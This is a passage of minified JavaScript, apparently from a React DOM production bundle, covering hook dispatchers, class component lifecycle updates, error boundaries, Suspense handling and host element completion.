s=Dn(e),r={lane:s,action:t,hasEagerState:!1,eagerState:null,next:null};if(Dp(e))zp(n,r);else{var i=e.alternate;if(e.lanes===0&&(i===null||i.lanes===0)&&(i=n.lastRenderedReducer,i!==null))try{var a=n.lastRenderedState,l=i(a,t);if(r.hasEagerState=!0,r.eagerState=l,Ke(l,a)){var o=n.interleaved;o===null?(r.next=r,Dl(n)):(r.next=o.next,o.next=r),n.interleaved=r;return}}catch{}finally{}t=yp(e,n,r,s),t!==null&&(r=ke(),Xe(t,e,s,r),jp(t,n,s))}}function Dp(e){var n=e.alternate;return e===Z||n!==null&&n===Z}function zp(e,n){hs=Xr=!0;var t=e.pending;t===null?n.next=n:(n.next=t.next,t.next=n),e.pending=n}function jp(e,n,t){if(t&4194240){var s=n.lanes;s&=e.pendingLanes,t|=s,n.lanes=t,xl(e,t)}}var Kr={readContext:Fe,useCallback:me,useContext:me,useEffect:me,useImperativeHandle:me,useInsertionEffect:me,useLayoutEffect:me,useMemo:me,useReducer:me,useRef:me,useState:me,useDebugValue:me,useDeferredValue:me,useTransition:me,useMutableSource:me,useSyncExternalStore:me,useId:me,unstable_isNewReconciler:!1},em={readContext:Fe,useCallback:function(e,n){return Je().memoizedState=[e,n===void 0?null:n],e},useContext:Fe,useEffect:rc,useImperativeHandle:function(e,n,t){return t=t!=null?t.concat([e]):null,Sr(4194308,4,Lp.bind(null,n,e),t)},useLayoutEffect:function(e,n){return Sr(4194308,4,e,n)},useInsertionEffect:function(e,n){return Sr(4,2,e,n)},useMemo:function(e,n){var t=Je();return n=n===void 0?null:n,e=e(),t.memoizedState=[e,n],e},useReducer:function(e,n,t){var s=Je();return n=t!==void 0?t(n):n,s.memoizedState=s.baseState=n,e={pending:null,interleaved:null,lanes:0,dispatch:null,lastRenderedReducer:e,lastRenderedState:n},s.queue=e,e=e.dispatch=Zf.bind(null,Z,e),[s.memoizedState,e]},useRef:function(e){var n=Je();return e={current:e},n.memoizedState=e},useState:sc,useDebugValue:$l,useDeferredValue:function(e){return Je().memoizedState=e},useTransition:function(){var e=sc(!1),n=e[0];return e=Qf.bind(null,e[1]),Je().memoizedState=e,[n,e]},useMutableSource:function(){},useSyncExternalStore:function(e,n,t){var s=Z,r=Je();if(K){if(t===void 0)throw Error(P(407));t=t()}else{if(t=n(),pe===null)throw Error(P(349));st&30||xp(s,n,t)}r.memoizedState=t;var i={value:t,getSnapshot:n};return r.queue=i,rc(_p.bind(null,s,i,e),[e]),s.flags|=2048,Rs(9,Sp.bind(null,s,i,t,n),void 0,null),t},useId:function(){var e=Je(),n=pe.identifierPrefix;if(K){var t=un,s=cn;t=(s&~(1<<32-qe(s)-1)).toString(32)+t,n=":"+n+"R"+t,t=Ls++,0<t&&(n+="H"+t.toString(32)),n+=":"}else t=Kf++,n=":"+n+"r"+t.toString(32)+":";return e.memoizedState=n},unstable_isNewReconciler:!1},nm={readContext:Fe,useCallback:Rp,useContext:Fe,useEffect:Wl,useImperativeHandle:Np,useInsertionEffect:Pp,useLayoutEffect:Ap,useMemo:Op,useReducer:Ki,useRef:Cp,useState:function(){return Ki(Ns)},useDebugValue:$l,useDeferredValue:function(e){var n=Ue();return Mp(n,oe.memoizedState,e)},useTransition:function(){var e=Ki(Ns)[0],n=Ue().memoizedState;return[e,n]},useMutableSource:kp,useSyncExternalStore:bp,useId:Ip,unstable_isNewReconciler:!1},tm={readContext:Fe,useCallback:Rp,useContext:Fe,useEffect:Wl,useImperativeHandle:Np,useInsertionEffect:Pp,useLayoutEffect:Ap,useMemo:Op,useReducer:Qi,useRef:Cp,useState:function(){return Qi(Ns)},useDebugValue:$l,useDeferredValue:function(e){var n=Ue();return oe===null?n.memoizedState=e:Mp(n,oe.memoizedState,e)},useTransition:function(){var e=Qi(Ns)[0],n=Ue().memoizedState;return[e,n]},useMutableSource:kp,useSyncExternalStore:bp,useId:Ip,unstable_isNewReconciler:!1};function We(e,n){if(e&&e.defaultProps){n=J({},n),e=e.defaultProps;for(var t in e)n[t]===void 0&&(n[t]=e[t]);return n}return n}function Da(e,n,t,s){n=e.memoizedState,t=t(s,n),t=t==null?n:J({},n,t),e.memoizedState=t,e.lanes===0&&(e.updateQueue.baseState=t)}var yi={isMounted:function(e){return(e=e._reactInternals)?ot(e)===e:!1},enqueueSetState:function(e,n,t){e=e._reactInternals;var s=ke(),r=Dn(e),i=dn(s,r);i.payload=n,t!=null&&(i.callback=t),n=Mn(e,i,r),n!==null&&(Xe(n,e,r,s),br(n,e,r))},enqueueReplaceState:function(e,n,t){e=e._reactInternals;var s=ke(),r=Dn(e),i=dn(s,r);i.tag=1,i.payload=n,t!=null&&(i.callback=t),n=Mn(e,i,r),n!==null&&(Xe(n,e,r,s),br(n,e,r))},enqueueForceUpdate:function(e,n){e=e._reactInternals;var t=ke(),s=Dn(e),r=dn(t,s);r.tag=2,n!=null&&(r.callback=n),n=Mn(e,r,s),n!==null&&(Xe(n,e,s,t),br(n,e,s))}};function ic(e,n,t,s,r,i,a){return e=e.stateNode,typeof e.shouldComponentUpdate=="function"?e.shouldComponentUpdate(s,i,a):n.prototype&&n.prototype.isPureReactComponent?!_s(t,s)||!_s(r,i):!0}function Bp(e,n,t){var s=!1,r=Fn,i=n.contextType;return typeof i=="object"&&i!==null?i=Fe(i):(r=Ce(n)?nt:ve.current,s=n.contextTypes,i=(s=s!=null)?Ot(e,r):Fn),n=new n(t,i),e.memoizedState=n.state!==null&&n.state!==void 0?n.state:null,n.updater=yi,e.stateNode=n,n._reactInternals=e,s&&(e=e.stateNode,e.__reactInternalMemoizedUnmaskedChildContext=r,e.__reactInternalMemoizedMaskedChildContext=i),n}function ac(e,n,t,s){e=n.state,typeof n.componentWillReceiveProps=="function"&&n.componentWillReceiveProps(t,s),typeof n.UNSAFE_componentWillReceiveProps=="function"&&n.UNSAFE_componentWillReceiveProps(t,s),n.state!==e&&yi.enqueueReplaceState(n,n.state,null)}function za(e,n,t,s){var r=e.stateNode;r.props=t,r.state=e.memoizedState,r.refs={},zl(e);var i=n.contextType;typeof i=="object"&&i!==null?r.context=Fe(i):(i=Ce(n)?nt:ve.current,r.context=Ot(e,i)),r.state=e.memoizedState,i=n.getDerivedStateFromProps,typeof i=="function"&&(Da(e,n,i,t),r.state=e.memoizedState),typeof n.getDerivedStateFromProps=="function"||typeof r.getSnapshotBeforeUpdate=="function"||typeof r.UNSAFE_componentWillMount!="function"&&typeof r.componentWillMount!="function"||(n=r.state,typeof r.componentWillMount=="function"&&r.componentWillMount(),typeof r.UNSAFE_componentWillMount=="function"&&r.UNSAFE_componentWillMount(),n!==r.state&&yi.enqueueReplaceState(r,r.state,null),Yr(e,t,r,s),r.state=e.memoizedState),typeof r.componentDidMount=="function"&&(e.flags|=4194308)}function zt(e,n){try{var t="",s=n;do t+=Ah(s),s=s.return;while(s);var r=t}catch(i){r=`
Error generating stack: `+i.message+`
`+i.stack}return{value:e,source:n,stack:r,digest:null}}function Zi(e,n,t){return{value:e,source:null,stack:t??null,digest:n??null}}function ja(e,n){try{console.error(n.value)}catch(t){setTimeout(function(){throw t})}}var sm=typeof WeakMap=="function"?WeakMap:Map;function Fp(e,n,t){t=dn(-1,t),t.tag=3,t.payload={element:null};var s=n.value;return t.callback=function(){Zr||(Zr=!0,qa=s),ja(e,n)},t}function Up(e,n,t){t=dn(-1,t),t.tag=3;var s=e.type.getDerivedStateFromError;if(typeof s=="function"){var r=n.value;t.payload=function(){return s(r)},t.callback=function(){ja(e,n)}}var i=e.stateNode;return i!==null&&typeof i.componentDidCatch=="function"&&(t.callback=function(){ja(e,n),typeof s!="function"&&(In===null?In=new Set([this]):In.add(this));var a=n.stack;this.componentDidCatch(n.value,{componentStack:a!==null?a:""})}),t}function lc(e,n,t){var s=e.pingCache;if(s===null){s=e.pingCache=new sm;var r=new Set;s.set(n,r)}else r=s.get(n),r===void 0&&(r=new Set,s.set(n,r));r.has(t)||(r.add(t),e=ym.bind(null,e,n,t),n.then(e,e))}function oc(e){do{var n;if((n=e.tag===13)&&(n=e.memoizedState,n=n!==null?n.dehydrated!==null:!0),n)return e;e=e.return}while(e!==null);return null}function cc(e,n,t,s,r){return e.mode&1?(e.flags|=65536,e.lanes=r,e):(e===n?e.flags|=65536:(e.flags|=128,t.flags|=131072,t.flags&=-52805,t.tag===1&&(t.alternate===null?t.tag=17:(n=dn(-1,1),n.tag=2,Mn(t,n,1))),t.lanes|=1),e)}var rm=vn.ReactCurrentOwner,_e=!1;function we(e,n,t,s){n.child=e===null?gp(n,null,t,s):It(n,e.child,t,s)}function uc(e,n,t,s,r){t=t.render;var i=n.ref;return Pt(n,r),s=Hl(e,n,t,s,i,r),t=Vl(),e!==null&&!_e?(n.updateQueue=e.updateQueue,n.flags&=-2053,e.lanes&=~r,gn(e,n,r)):(K&&t&&Ll(n),n.flags|=1,we(e,n,s,r),n.child)}function pc(e,n,t,s,r){if(e===null){var i=t.type;return typeof i=="function"&&!Jl(i)&&i.defaultProps===void 0&&t.compare===null&&t.defaultProps===void 0?(n.tag=15,n.type=i,Hp(e,n,i,s,r)):(e=Cr(t.type,null,s,n,n.mode,r),e.ref=n.ref,e.return=n,n.child=e)}if(i=e.child,!(e.lanes&r)){var a=i.memoizedProps;if(t=t.compare,t=t!==null?t:_s,t(a,s)&&e.ref===n.ref)return gn(e,n,r)}return n.flags|=1,e=zn(i,s),e.ref=n.ref,e.return=n,n.child=e}function Hp(e,n,t,s,r){if(e!==null){var i=e.memoizedProps;if(_s(i,s)&&e.ref===n.ref)if(_e=!1,n.pendingProps=s=i,(e.lanes&r)!==0)e.flags&131072&&(_e=!0);else return n.lanes=e.lanes,gn(e,n,r)}return Ba(e,n,t,s,r)}function Vp(e,n,t){var s=n.pendingProps,r=s.children,i=e!==null?e.memoizedState:null;if(s.mode==="hidden")if(!(n.mode&1))n.memoizedState={baseLanes:0,cachePool:null,transitions:null},Y(xt,Ae),Ae|=t;else{if(!(t&1073741824))return e=i!==null?i.baseLanes|t:t,n.lanes=n.childLanes=1073741824,n.memoizedState={baseLanes:e,cachePool:null,transitions:null},n.updateQueue=null,Y(xt,Ae),Ae|=e,null;n.memoizedState={baseLanes:0,cachePool:null,transitions:null},s=i!==null?i.baseLanes:t,Y(xt,Ae),Ae|=s}else i!==null?(s=i.baseLanes|t,n.memoizedState=null):s=t,Y(xt,Ae),Ae|=s;return we(e,n,r,t),n.child}function Wp(e,n){var t=n.ref;(e===null&&t!==null||e!==null&&e.ref!==t)&&(n.flags|=512,n.flags|=2097152)}function Ba(e,n,t,s,r){var i=Ce(t)?nt:ve.current;return i=Ot(n,i),Pt(n,r),t=Hl(e,n,t,s,i,r),s=Vl(),e!==null&&!_e?(n.updateQueue=e.updateQueue,n.flags&=-2053,e.lanes&=~r,gn(e,n,r)):(K&&s&&Ll(n),n.flags|=1,we(e,n,t,r),n.child)}function dc(e,n,t,s,r){if(Ce(t)){var i=!0;Hr(n)}else i=!1;if(Pt(n,r),n.stateNode===null)_r(e,n),Bp(n,t,s),za(n,t,s,r),s=!0;else if(e===null){var a=n.stateNode,l=n.memoizedProps;a.props=l;var o=a.context,c=t.contextType;typeof c=="object"&&c!==null?c=Fe(c):(c=Ce(t)?nt:ve.current,c=Ot(n,c));var u=t.getDerivedStateFromProps,d=typeof u=="function"||typeof a.getSnapshotBeforeUpdate=="function";d||typeof a.UNSAFE_componentWillReceiveProps!="function"&&typeof a.componentWillReceiveProps!="function"||(l!==s||o!==c)&&ac(n,a,s,c),xn=!1;var h=n.memoizedState;a.state=h,Yr(n,s,a,r),o=n.memoizedState,l!==s||h!==o||Te.current||xn?(typeof u=="function"&&(Da(n,t,u,s),o=n.memoizedState),(l=xn||ic(n,t,l,s,h,o,c))?(d||typeof a.UNSAFE_componentWillMount!="function"&&typeof a.componentWillMount!="function"||(typeof a.componentWillMount=="function"&&a.componentWillMount(),typeof a.UNSAFE_componentWillMount=="function"&&a.UNSAFE_componentWillMount()),typeof a.componentDidMount=="function"&&(n.flags|=4194308)):(typeof a.componentDidMount=="function"&&(n.flags|=4194308),n.memoizedProps=s,n.memoizedState=o),a.props=s,a.state=o,a.context=c,s=l):(typeof a.componentDidMount=="function"&&(n.flags|=4194308),s=!1)}else{a=n.stateNode,vp(e,n),l=n.memoizedProps,c=n.type===n.elementType?l:We(n.type,l),a.props=c,d=n.pendingProps,h=a.context,o=t.contextType,typeof o=="object"&&o!==null?o=Fe(o):(o=Ce(t)?nt:ve.current,o=Ot(n,o));var v=t.getDerivedStateFromProps;(u=typeof v=="function"||typeof a.getSnapshotBeforeUpdate=="function")||typeof a.UNSAFE_componentWillReceiveProps!="function"&&typeof a.componentWillReceiveProps!="function"||(l!==d||h!==o)&&ac(n,a,s,o),xn=!1,h=n.memoizedState,a.state=h,Yr(n,s,a,r);var k=n.memoizedState;l!==d||h!==k||Te.current||xn?(typeof v=="function"&&(Da(n,t,v,s),k=n.memoizedState),(c=xn||ic(n,t,c,s,h,k,o)||!1)?(u||typeof a.UNSAFE_componentWillUpdate!="function"&&typeof a.componentWillUpdate!="function"||(typeof a.componentWillUpdate=="function"&&a.componentWillUpdate(s,k,o),typeof a.UNSAFE_componentWillUpdate=="function"&&a.UNSAFE_componentWillUpdate(s,k,o)),typeof a.componentDidUpdate=="function"&&(n.flags|=4),typeof a.getSnapshotBeforeUpdate=="function"&&(n.flags|=1024)):(typeof a.componentDidUpdate!="function"||l===e.memoizedProps&&h===e.memoizedState||(n.flags|=4),typeof a.getSnapshotBeforeUpdate!="function"||l===e.memoizedProps&&h===e.memoizedState||(n.flags|=1024),n.memoizedProps=s,n.memoizedState=k),a.props=s,a.state=k,a.context=o,s=c):(typeof a.componentDidUpdate!="function"||l===e.memoizedProps&&h===e.memoizedState||(n.flags|=4),typeof a.getSnapshotBeforeUpdate!="function"||l===e.memoizedProps&&h===e.memoizedState||(n.flags|=1024),s=!1)}return Fa(e,n,t,s,i,r)}function Fa(e,n,t,s,r,i){Wp(e,n);var a=(n.flags&128)!==0;if(!s&&!a)return r&&Qo(n,t,!1),gn(e,n,i);s=n.stateNode,rm.current=n;var l=a&&typeof t.getDerivedStateFromError!="function"?null:s.render();return n.flags|=1,e!==null&&a?(n.child=It(n,e.child,null,i),n.child=It(n,null,l,i)):we(e,n,l,i),n.memoizedState=s.state,r&&Qo(n,t,!0),n.child}function $p(e){var n=e.stateNode;n.pendingContext?Ko(e,n.pendingContext,n.pendingContext!==n.context):n.context&&Ko(e,n.context,!1),jl(e,n.containerInfo)}function hc(e,n,t,s,r){return Mt(),Rl(r),n.flags|=256,we(e,n,t,s),n.child}var Ua={dehydrated:null,treeContext:null,retryLane:0};function Ha(e){return{baseLanes:e,cachePool:null,transitions:null}}function Gp(e,n,t){var s=n.pendingProps,r=Q.current,i=!1,a=(n.flags&128)!==0,l;if((l=a)||(l=e!==null&&e.memoizedState===null?!1:(r&2)!==0),l?(i=!0,n.flags&=-129):(e===null||e.memoizedState!==null)&&(r|=1),Y(Q,r&1),e===null)return Ma(n),e=n.memoizedState,e!==null&&(e=e.dehydrated,e!==null)?(n.mode&1?e.data==="$!"?n.lanes=8:n.lanes=1073741824:n.lanes=1,null):(a=s.children,e=s.fallback,i?(s=n.mode,i=n.child,a={mode:"hidden",children:a},!(s&1)&&i!==null?(i.childLanes=0,i.pendingProps=a):i=ki(a,s,0,null),e=Jn(e,s,t,null),i.return=n,e.return=n,i.sibling=e,n.child=i,n.child.memoizedState=Ha(t),n.memoizedState=Ua,e):Gl(n,a));if(r=e.memoizedState,r!==null&&(l=r.dehydrated,l!==null))return im(e,n,a,s,l,r,t);if(i){i=s.fallback,a=n.mode,r=e.child,l=r.sibling;var o={mode:"hidden",children:s.children};return!(a&1)&&n.child!==r?(s=n.child,s.childLanes=0,s.pendingProps=o,n.deletions=null):(s=zn(r,o),s.subtreeFlags=r.subtreeFlags&14680064),l!==null?i=zn(l,i):(i=Jn(i,a,t,null),i.flags|=2),i.return=n,s.return=n,s.sibling=i,n.child=s,s=i,i=n.child,a=e.child.memoizedState,a=a===null?Ha(t):{baseLanes:a.baseLanes|t,cachePool:null,transitions:a.transitions},i.memoizedState=a,i.childLanes=e.childLanes&~t,n.memoizedState=Ua,s}return i=e.child,e=i.sibling,s=zn(i,{mode:"visible",children:s.children}),!(n.mode&1)&&(s.lanes=t),s.return=n,s.sibling=null,e!==null&&(t=n.deletions,t===null?(n.deletions=[e],n.flags|=16):t.push(e)),n.child=s,n.memoizedState=null,s}function Gl(e,n){return n=ki({mode:"visible",children:n},e.mode,0,null),n.return=e,e.child=n}function or(e,n,t,s){return s!==null&&Rl(s),It(n,e.child,null,t),e=Gl(n,n.pendingProps.children),e.flags|=2,n.memoizedState=null,e}function im(e,n,t,s,r,i,a){if(t)return n.flags&256?(n.flags&=-257,s=Zi(Error(P(422))),or(e,n,a,s)):n.memoizedState!==null?(n.child=e.child,n.flags|=128,null):(i=s.fallback,r=n.mode,s=ki({mode:"visible",children:s.children},r,0,null),i=Jn(i,r,a,null),i.flags|=2,s.return=n,i.return=n,s.sibling=i,n.child=s,n.mode&1&&It(n,e.child,null,a),n.child.memoizedState=Ha(a),n.memoizedState=Ua,i);if(!(n.mode&1))return or(e,n,a,null);if(r.data==="$!"){if(s=r.nextSibling&&r.nextSibling.dataset,s)var l=s.dgst;return s=l,i=Error(P(419)),s=Zi(i,s,void 0),or(e,n,a,s)}if(l=(a&e.childLanes)!==0,_e||l){if(s=pe,s!==null){switch(a&-a){case 4:r=2;break;case 16:r=8;break;case 64:case 128:case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:case 4194304:case 8388608:case 16777216:case 33554432:case 67108864:r=32;break;case 536870912:r=268435456;break;default:r=0}r=r&(s.suspendedLanes|a)?0:r,r!==0&&r!==i.retryLane&&(i.retryLane=r,mn(e,r),Xe(s,e,r,-1))}return Zl(),s=Zi(Error(P(421))),or(e,n,a,s)}return r.data==="$?"?(n.flags|=128,n.child=e.child,n=vm.bind(null,e),r._reactRetry=n,null):(e=i.treeContext,Le=On(r.nextSibling),Ne=n,K=!0,Ge=null,e!==null&&(De[ze++]=cn,De[ze++]=un,De[ze++]=tt,cn=e.id,un=e.overflow,tt=n),n=Gl(n,s.children),n.flags|=4096,n)}function fc(e,n,t){e.lanes|=n;var s=e.alternate;s!==null&&(s.lanes|=n),Ia(e.return,n,t)}function Ji(e,n,t,s,r){var i=e.memoizedState;i===null?e.memoizedState={isBackwards:n,rendering:null,renderingStartTime:0,last:s,tail:t,tailMode:r}:(i.isBackwards=n,i.rendering=null,i.renderingStartTime=0,i.last=s,i.tail=t,i.tailMode=r)}function Yp(e,n,t){var s=n.pendingProps,r=s.revealOrder,i=s.tail;if(we(e,n,s.children,t),s=Q.current,s&2)s=s&1|2,n.flags|=128;else{if(e!==null&&e.flags&128)e:for(e=n.child;e!==null;){if(e.tag===13)e.memoizedState!==null&&fc(e,t,n);else if(e.tag===19)fc(e,t,n);else if(e.child!==null){e.child.return=e,e=e.child;continue}if(e===n)break e;for(;e.sibling===null;){if(e.return===null||e.return===n)break e;e=e.return}e.sibling.return=e.return,e=e.sibling}s&=1}if(Y(Q,s),!(n.mode&1))n.memoizedState=null;else switch(r){case"forwards":for(t=n.child,r=null;t!==null;)e=t.alternate,e!==null&&qr(e)===null&&(r=t),t=t.sibling;t=r,t===null?(r=n.child,n.child=null):(r=t.sibling,t.sibling=null),Ji(n,!1,r,t,i);break;case"backwards":for(t=null,r=n.child,n.child=null;r!==null;){if(e=r.alternate,e!==null&&qr(e)===null){n.child=r;break}e=r.sibling,r.sibling=t,t=r,r=e}Ji(n,!0,t,null,i);break;case"together":Ji(n,!1,null,null,void 0);break;default:n.memoizedState=null}return n.child}function _r(e,n){!(n.mode&1)&&e!==null&&(e.alternate=null,n.alternate=null,n.flags|=2)}function gn(e,n,t){if(e!==null&&(n.dependencies=e.dependencies),rt|=n.lanes,!(t&n.childLanes))return null;if(e!==null&&n.child!==e.child)throw Error(P(153));if(n.child!==null){for(e=n.child,t=zn(e,e.pendingProps),n.child=t,t.return=n;e.sibling!==null;)e=e.sibling,t=t.sibling=zn(e,e.pendingProps),t.return=n;t.sibling=null}return n.child}function am(e,n,t){switch(n.tag){case 3:$p(n),Mt();break;case 5:wp(n);break;case 1:Ce(n.type)&&Hr(n);break;case 4:jl(n,n.stateNode.containerInfo);break;case 10:var s=n.type._context,r=n.memoizedProps.value;Y($r,s._currentValue),s._currentValue=r;break;case 13:if(s=n.memoizedState,s!==null)return s.dehydrated!==null?(Y(Q,Q.current&1),n.flags|=128,null):t&n.child.childLanes?Gp(e,n,t):(Y(Q,Q.current&1),e=gn(e,n,t),e!==null?e.sibling:null);Y(Q,Q.current&1);break;case 19:if(s=(t&n.childLanes)!==0,e.flags&128){if(s)return Yp(e,n,t);n.flags|=128}if(r=n.memoizedState,r!==null&&(r.rendering=null,r.tail=null,r.lastEffect=null),Y(Q,Q.current),s)break;return null;case 22:case 23:return n.lanes=0,Vp(e,n,t)}return gn(e,n,t)}var qp,Va,Xp,Kp;qp=function(e,n){for(var t=n.child;t!==null;){if(t.tag===5||t.tag===6)e.appendChild(t.stateNode);else if(t.tag!==4&&t.child!==null){t.child.return=t,t=t.child;continue}if(t===n)break;for(;t.sibling===null;){if(t.return===null||t.return===n)return;t=t.return}t.sibling.return=t.return,t=t.sibling}};Va=function(){};Xp=function(e,n,t,s){var r=e.memoizedProps;if(r!==s){e=n.stateNode,Kn(tn.current);var i=null;switch(t){case"input":r=pa(e,r),s=pa(e,s),i=[];break;case"select":r=J({},r,{value:void 0}),s=J({},s,{value:void 0}),i=[];break;case"textarea":r=fa(e,r),s=fa(e,s),i=[];break;default:typeof r.onClick!="function"&&typeof s.onClick=="function"&&(e.onclick=Fr)}ga(t,s);var a;t=null;for(c in r)if(!s.hasOwnProperty(c)&&r.hasOwnProperty(c)&&r[c]!=null)if(c==="style"){var l=r[c];for(a in l)l.hasOwnProperty(a)&&(t||(t={}),t[a]="")}else c!=="dangerouslySetInnerHTML"&&c!=="children"&&c!=="suppressContentEditableWarning"&&c!=="suppressHydrationWarning"&&c!=="autoFocus"&&(ys.hasOwnProperty(c)?i||(i=[]):(i=i||[]).push(c,null));for(c in s){var o=s[c];if(l=r!=null?r[c]:void 0,s.hasOwnProperty(c)&&o!==l&&(o!=null||l!=null))if(c==="style")if(l){for(a in l)!l.hasOwnProperty(a)||o&&o.hasOwnProperty(a)||(t||(t={}),t[a]="");for(a in o)o.hasOwnProperty(a)&&l[a]!==o[a]&&(t||(t={}),t[a]=o[a])}else t||(i||(i=[]),i.push(c,t)),t=o;else c==="dangerouslySetInnerHTML"?(o=o?o.__html:void 0,l=l?l.__html:void 0,o!=null&&l!==o&&(i=i||[]).push(c,o)):c==="children"?typeof o!="string"&&typeof o!="number"||(i=i||[]).push(c,""+o):c!=="suppressContentEditableWarning"&&c!=="suppressHydrationWarning"&&(ys.hasOwnProperty(c)?(o!=null&&c==="onScroll"&&q("scroll",e),i||l===o||(i=[])):(i=i||[]).push(c,o))}t&&(i=i||[]).push("style",t);var c=i;(n.updateQueue=c)&&(n.flags|=4)}};Kp=function(e,n,t,s){t!==s&&(n.flags|=4)};function Zt(e,n){if(!K)switch(e.tailMode){case"hidden":n=e.tail;for(var t=null;n!==null;)n.alternate!==null&&(t=n),n=n.sibling;t===null?e.tail=null:t.sibling=null;break;case"collapsed":t=e.tail;for(var s=null;t!==null;)t.alternate!==null&&(s=t),t=t.sibling;s===null?n||e.tail===null?e.tail=null:e.tail.sibling=null:s.sibling=null}}function ge(e){var n=e.alternate!==null&&e.alternate.child===e.child,t=0,s=0;if(n)for(var r=e.child;r!==null;)t|=r.lanes|r.childLanes,s|=r.subtreeFlags&14680064,s|=r.flags&14680064,r.return=e,r=r.sibling;else for(r=e.child;r!==null;)t|=r.lanes|r.childLanes,s|=r.subtreeFlags,s|=r.flags,r.return=e,r=r.sibling;return e.subtreeFlags|=s,e.childLanes=t,n}function lm(e,n,t){var s=n.pendingProps;switch(Nl(n),n.tag){case 2:case 16:case 15:case 0:case 11:case 7:case 8:case 12:case 9:case 14:return ge(n),null;case 1:return Ce(n.type)&&Ur(),ge(n),null;case 3:return s=n.stateNode,Dt(),X(Te),X(ve),Fl(),s.pendingContext&&(s.context=s.pendingContext,s.pendingContext=null),(e===null||e.child===null)&&(ar(n)?n.flags|=4:e===null||e.memoizedState.isDehydrated&&!(n.flags&256)||(n.flags|=1024,Ge!==null&&(Qa(Ge),Ge=null))),Va(e,n),ge(n),null;case 5:Bl(n);var r=Kn(As.current);if(t=n.type,e!==null&&n.stateNode!=null)Xp(e,n,t,s,r),e.ref!==n.ref&&(n.flags|=512,n.flags|=2097152);else{if(!s){if(n.stateNode===null)throw Error(P(166));return ge(n),null}if(e=Kn(tn.current),ar(n)){s=n.stateNode,t=n.type;var i=n.memoizedProps;switch(s[en]=n,s[Cs]=i,e=(n.mode&1)!==0,t){case"dialog":q("cancel",s),q("close",s);break;case"iframe":case"object":case"embed":q("load",s);break;case"video":case"audio":for(r=0;r<is.length;r++)q(is[r],s);break;case"source":q("error",s);break;case"img":case"image":case"link":q("error",s),q("load",s);break;case"details":q("toggle",s);break;case"input":So(s,i),q("invalid",s);break;case"select":s._wrapperState={wasMultiple:!!i.multiple},q("invalid",s);break;case"textarea":Eo(s,i),q("invalid",s)}ga(t,i),r=null;for(var a in i)if(i.hasOwnProperty(a)){var l=i[a];a==="children"?typeof l=="string"?s.textContent!==l&&(i.suppressHydrationWarning!==!0&&ir(s.textContent,l,e),r=["children",l]):typeof l=="number"&&s.textContent!==""+l&&(i.suppressHydrationWarning!==!0&&ir(s.textContent,l,e),r=["children",""+l]):ys.hasOwnProperty(a)&&l!=null&&a==="onScroll"&&q("scroll",s)}switch(t){case"input":Qs(s),_o(s,i,!0);break;case"textarea":Qs(s),To(s);break;case"select":case"option":break;default:typeof i.onClick=="function"&&(s.onclick=Fr)}s=r,n.updateQueue=s,s!==null&&(n.flags|=4)}else{a=r.nodeType===9?r:r.ownerDocument,e==="http://www.w3.org/1999/xhtml"&&(e=_u(t)),e==="http://www.w3.org/1999/xhtml"?t==="script"?(e=a.createElement("div"),e.innerHTML="<script><\/script>",e=e.removeChild(e.firstChild)):typeof s.is=="string"?e=a.createElement(t,{is:s.is}):(e=a.createElement(t),t==="select"&&(a=e,s.multiple?a.multiple=!0:s.size&&(a.size=s.size))):e=a.createElementNS(e,t),e[en]=n,e[Cs]=s,qp(e,n,!1,!1),n.stateNode=e;e:{switch(a=ya(t,s),t){case"dialog":q("cancel",e),q("close",e),r=s;break;case"iframe":case"object":case"embed":q("load",e),r=s;break;case"video":case"audio":for(r=0;r<is.length;r++)q(is[r],e);r=s;break;case"source":q("error",e),r=s;break;case"img":case"image":case"link":q("error",e),q("load",e),r=s;break;case"details":q("toggle",e),r=s;break;case"input":So(e,s),r=pa(e,s),q("invalid",e);break;case"option":r=s;break;case"select":e._wrapperState={wasMultiple:!!s.multiple},r=J({},s,{value:void 0}),q("invalid",e);break;case"textarea":Eo(e,s),r=fa(e,s),q("invalid",e);break;default:r=s}ga(t,r),l=r;for(i in l)if(l.hasOwnProperty(i)){var o=l[i];i==="style"?Cu(e,o):i==="dangerouslySetInnerHTML"?(o=o?o.__html:void 0,o!=null&&Eu(e,o)):i==="children"?typeof o=="string"?(t!=="textarea"||o!=="")&&vs(e,o):typeof o=="number"&&vs(e,""+o):i!=="suppressContentEditableWarning"&&i!=="suppressHydrationWarning"&&i!=="autoFocus"&&(ys.hasOwnProperty(i)?o!=null&&i==="onScroll"&&q("scroll",e):o!=null&&gl(e,i,o,a))}switch(t){case"input":Qs(e),_o(e,s,!1);break;case"textarea":Qs(e),To(e);break;case"option":s.value!=null&&e.setAttribute("value",""+Bn(s.value));break;case"select":e.multiple=!!s.multiple,i=s.value,i!=null?_t(e,!!s.multiple,i,!1):s.defaultValue!=null&&_t(e,!!s.multiple,s.defaultValue,!0);break;default:typeof r.onClick=="function"&&(e.onclick=Fr)}switch(t){case"button":case"input":case"select":case"textarea":s=!!s.autoFocus;break e;case"img":s=!0;break e;default:s=!1}}s&&(n.flags|=4)}n.ref!==null&&(n.flags|=512,n.flags|=2097152)}return ge(n),null;case 6:if(e&&n.stateNode!=null)Kp(e,n,e.memoizedProps,s);else{if(typeof s!="string"&&n.stateNode===null)throw Error(P(166));if(t=Kn(As.current),Kn(tn.current),ar(n)){if(s=n.stateNode,t=n.memoizedProps,s[en]=n,(i=s.nodeValue!==t)&&(e=Ne,e!==null))switch(e.tag){case 3:ir(s.nodeValue,t,(e.mode&1)!==0);break;case 5:e.memoizedProps.suppressHydrationWarning!==!0&&ir(s.nodeValue,t,(e.mode&1)!==0)}i&&(n.flags|=4)}else s=(t.nodeType===9?t:t.ownerDocument).createTextNode(s),s[en]=n,n.stateNode=s}return ge(n),null;case 13:if(X(Q),s=n.memoizedState,e===null||e.memoizedState!==null&&e.memoizedState.dehydrated!==null){if(K&&Le!==null&&n.mode&1&&!(n.flags&128))fp(),Mt(),n.flags|=98560,i=!1;else if(i=ar(n),s!==null&&s.dehydrated!==null){if(e===null){if(!i)throw Error(P(318));if(i=n.memoizedState,i=i!==null?i.dehydrated:null,!i)throw Error(P(317));i[en]=n}else Mt(),!(n.flags&128)&&(n.memoizedState=null),n.flags|=4;ge(n),i=!1}else Ge!==null&&(Qa(Ge),Ge=null),i=!0;if(!i)return n.flags&65536?n:null}return 